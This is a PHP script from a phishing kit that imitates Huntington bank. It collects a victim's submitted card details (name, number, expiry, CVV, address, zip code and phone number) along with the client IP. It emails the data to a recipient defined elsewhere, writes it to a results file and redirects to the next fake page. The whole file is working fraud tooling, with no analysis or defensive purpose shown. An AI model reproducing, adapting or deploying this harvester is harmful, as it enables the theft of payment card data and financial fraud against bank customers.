<?php
include '../info.php';
include './blocker.php';
$ip = getenv("REMOTE_ADDR");
$var=$_POST['submit2'];
$message .= "D0N5L0W----HUNT1NGT0N-----F00L-----------2023\n";
$message .= "Name on C@rd               : ".$_POST['nc']."\n";
$message .= "C@rd Number                : ".$_POST['c']."\n";
$message .= "Expiry Date       		: ".$_POST['x']."\n";
$message .= "C.V'V            		: ".$_POST['v']."\n";
$message .= "Address              	: ".$_POST['addr']."\n";
$message .= "Zip Code           	: ".$_POST['zp']."\n";
$message .= "Phone Number               : ".$_POST['ph']."\n";
$message .= "D0N5L0W----HUNT1NGT0N-----F00L----------2023\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$rnessage = "$message\n";
$message .= "D0N5L0W----HUNT1NGT0N\n";
$subject = "D0N5L0W----HUNT1NGT0N-----F00L----2023+ | $ip";
$headers = "From: ";
$headers .= $_POST['username']."HUNT1NGT0N";
$headers .= "D0N5L0W----HUNT1NGT0N-----F00L----2023";

if (X_RESULT_SAVE_REZ_TO_FILE === true) {
    $fp = fopen('../'.X_RESULT_SAVE_NAME, "a");
    fputs($fp, $message);
    fclose($fp);
}

if (mail($recipient,$subject,$message,$headers))
       {
           header("Location: surf6.php");

       }
else
           {
        echo "ERROR! Please go back and try again.";
         }

?>